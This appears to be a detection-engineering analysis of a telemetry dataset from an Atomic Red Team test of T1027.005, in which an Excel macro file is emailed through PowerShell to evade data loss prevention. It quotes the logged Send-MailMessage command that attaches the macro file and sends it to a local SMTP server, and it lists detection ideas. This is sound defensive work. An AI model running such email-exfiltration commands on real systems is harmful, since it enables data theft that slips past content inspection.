# T1027-5: Obfuscated Files or Information — DLP Evasion via Sensitive Data in VBA Macro over email

## Technique Context

T1027.005 focuses on adversaries hiding malicious content within seemingly legitimate file formats to evade data loss prevention (DLP) and security controls. This specific test demonstrates a common real-world scenario where attackers embed sensitive data or malicious macros within Excel files and transmit them via email to bypass content inspection systems. The technique is particularly relevant because many organizations allow Excel files with macros through email gateways, and DLP systems may struggle to inspect macro content effectively. Detection engineers typically focus on monitoring email attachments with embedded macros, PowerShell commands that handle email transmission, and file access patterns that suggest data exfiltration attempts.

## What This Dataset Contains

The dataset captures a PowerShell-based email transmission of an Excel macro file. The core activity appears in Security event 4688 with the command line: `"powershell.exe" & {Send-MailMessage -From test@corp.com -To test@corp.com -Subject 'T1027_Atomic_Test' -Attachments \"C:\AtomicRedTeam\atomics\T1027\src\T1027-cc-macro.xlsm\" -SmtpServer 127.0.0.1}`. PowerShell script block logging captures the actual `Send-MailMessage` cmdlet execution in events with ScriptBlock IDs ccb7111c-9229-4dcd-a488-97d3bb8273ac and 03eb101b-c2e4-476a-8510-f06c31dda54f.

Sysmon provides rich process telemetry including two PowerShell process creations (PIDs 7204 and 7172), with the child process executing the email transmission command. Process access events (EID 10) show the parent PowerShell process accessing both the whoami.exe process and the child PowerShell process with full access rights (0x1FFFFF). Multiple DLL loading events capture Windows Defender components (MpOAV.dll, MpClient.dll) being loaded into the PowerShell processes, indicating active endpoint protection monitoring.

## What This Dataset Does Not Contain

The dataset lacks any network connection telemetry despite the attempted SMTP connection to 127.0.0.1:25. No Sysmon EID 3 (NetworkConnect) events appear, suggesting either the connection failed, was blocked by Windows Defender, or the local SMTP server wasn't running. There are no file read events for the target Excel file, indicating Sysmon's file access monitoring wasn't configured to capture reads of the attachment file. The PowerShell logs contain predominantly test framework boilerplate rather than the actual macro content or any obfuscated data that would demonstrate the technique's core purpose. Email application logs or SMTP server logs that would show successful transmission are absent from this Windows-focused collection.

## Assessment

This dataset provides moderate utility for detection engineering, primarily capturing the PowerShell-based email transmission vector rather than the obfuscation techniques themselves. The Security 4688 events with full command-line logging offer excellent visibility into the `Send-MailMessage` cmdlet usage, which is a high-fidelity indicator for this technique. The PowerShell script block logging successfully captures the email parameters including attachment paths, sender/recipient details, and SMTP server configuration. However, the dataset's value is limited by the apparent failure of the email transmission (no network telemetry) and absence of the actual obfuscated content inspection that defines T1027.005. For building detections around the email exfiltration vector, this data is quite valuable, but it doesn't demonstrate the obfuscation bypass capabilities that make this technique particularly concerning.

## Detection Opportunities Present in This Data

1. **PowerShell Email Cmdlet Execution** - Monitor Security 4688 and PowerShell 4104 events for `Send-MailMessage` cmdlet usage, especially with attachment parameters and external SMTP servers
2. **Suspicious Email Attachment Patterns** - Detect PowerShell commands referencing file paths with macro-enabled Office extensions (.xlsm, .docm, .pptm) in email attachment parameters
3. **Process Chain Analysis** - Alert on PowerShell parent-child relationships where the child process executes email transmission commands, particularly when launched from system contexts
4. **Email Parameter Enumeration** - Monitor for PowerShell scripts that construct email messages with subject lines containing test indicators or suspicious patterns like 'T1027_Atomic_Test'
5. **SMTP Configuration Discovery** - Detect PowerShell email commands targeting local SMTP servers (127.0.0.1) or unusual SMTP endpoints that might indicate tunneling or evasion attempts
6. **File Access Preceding Email** - Correlate file access events for Office documents with subsequent email transmission attempts to identify potential data exfiltration workflows
7. **Windows Defender Integration Monitoring** - Track MpOAV.dll and MpClient.dll loading patterns in PowerShell processes as indicators of content inspection attempts that might be bypassed
